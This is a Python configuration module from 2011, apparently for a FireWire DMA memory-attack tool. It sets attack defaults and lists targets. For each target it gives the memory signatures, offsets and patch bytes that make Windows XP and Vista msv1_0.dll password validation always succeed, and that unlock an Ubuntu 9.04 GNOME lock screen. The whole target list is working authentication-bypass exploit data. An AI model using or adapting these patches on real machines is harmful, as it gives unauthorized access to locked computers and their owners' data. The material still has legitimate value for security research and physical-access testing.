'''
Created on Sep 6, 2011

@author: carsten
'''
#===============================================================================
# Configuration file with signatures
#===============================================================================
configfile = 'config.json'

#===============================================================================
# Constants
#===============================================================================
KiB = 1024              # One KiloByte
MiB = 1024 * KiB        # One MegaByte
GiB = 1024 * MiB        # One GigaByte
PAGESIZE = 4 * KiB      # For the sake of this tool, this is always the case

    
#===============================================================================
# Global variables/defaults
#===============================================================================
verbose = False         # Not verbose
fw_delay = 15           # 15 seconds delay before attacking
filemode = False        # Search in file instead of FW DMA
dry_run = False         # No write-back into memory
target = False          # No target set
filename = ''           # No filename set per default
buflen = 15             # Buffer length for checking if we get data
memsize = 4 * GiB       # 4GiB
success = True          # Optimistic-by-nature setting
encoding = None         # System encoding
vectorsize = 128        # Read vector size

#===============================================================================
# Targets are collected in a list of dicts using the following syntax:
# [{'OS': 'OS 1 name' # Used for matching and OS guessing
#  'name': 'Target 1 name', # Name
#  'signatures': [
#                 # 1st signature. Signatures are in an ordered list, and are
#                 # searched for in the sequence listed. If not 'keepsearching'
#                 # key is set, the tool will stop at the first match & patch.
#                 {'offsets': 0x00, # Relative to page boundary
#                  'keepsearching': True # Keep searching for sigs for target
#                  'chunks': [{'chunk': 0x00, # Signature to search for
#                              'internaloffset': 0x00, # Relative to offset
#                              'patch': 0xff, # Patch data
#                              'patchoffset': 0x00}]}, # Patch at an offset
#                 # 2nd signature. Demonstrates use of several offsets that
#                 # makes it easier to match signatures where the offset change
#                 # often. Also demonstrates split signatures; where the tool
#                 # matches that are split over several blobs of data. The
#                 # resulting patch below is '0x04__05' where no matching is
#                 # done for the data represented by '__'.
#                 {'offsets': [0x01, 0x02], # Signatures can have several offs
#                  'chunks': [{'chunk': 0x04, # 1st part of signature
#                              'internaloffset': 0x00,
#                              'patch': 0xff, # Patch data for the 1st part
#                              'patchoffset': 0x03}, # Patch at an offset
#                             {'chunk': 0x05, # 2nd part of signature
#                              'internaloffset': 0x02, # Offset relative to sig
#                              'patch': 0xff}]}]}] # Patch data for the 2nd part
#
# Keys 'keepgoing' and 'patchoffset' are optional and will be treated like
# 'None' if not provided.
#
# OS key should follow the rudimentary format 'Name Version SP Architecture'
#===============================================================================
targets=[{'OS': 'Windows Vista (x86)',
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'signatures': [{'offsets': [0x76a, 0x80F],
                          'chunks': [{'chunk': 0x8bff558bec81ec88000000a1a4,
                                      'internaloffset': 0x00,
                                      'patch': 0xb001,
                                      'patchoffset': 0xbd}]}]},
         {'OS': 'Windows XP SP3',
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'signatures': [{'offsets': [0x8aa, 0x862],
                          'chunks': [{'chunk': 0x83f8107511b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b}]}]},
         {'OS': 'Windows XP SP2',
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'signatures': [{'offsets': 0x946,
                          'chunks': [{'chunk': 0x83f8107513f0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b}]},
                         {'offsets': 0x927,
                          'chunks': [{'chunk': 0x8bff558bec83ec50a1,
                                      'internaloffset': 0x00,
                                      'patch': 0xb001,
                                      'patchoffset': 0xa5}]}]},
         {'OS': 'Test',
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'signatures': [{'offsets': [0x00, 0x01],
                          'chunks': [{'chunk': 0xaa43524428,
                                      'internaloffset': 0x00,
                                      'patch': 0x3332}]},
                         {'offsets': 0x02,
                          'chunks': [{'chunk': 0xaa43524428,
                                      'internaloffset': 0x00,
                                      'patch': 0x3332}]}]}, #Hopper over
         {'OS': 'Ubuntu 9.04 (x32)',
          'name': 'Gnome lockscreen unlock',
          'signatures': [{'offsets': 0xd3f,
                          'chunks': [{'chunk': 0xe8cc61000085c00f85e4000000c74424100e460508c744240c14460508c744240827010000c74424042d,
                                      'internaloffset': 0x00,
                                      'patch': 0xb80100000085}]}]}]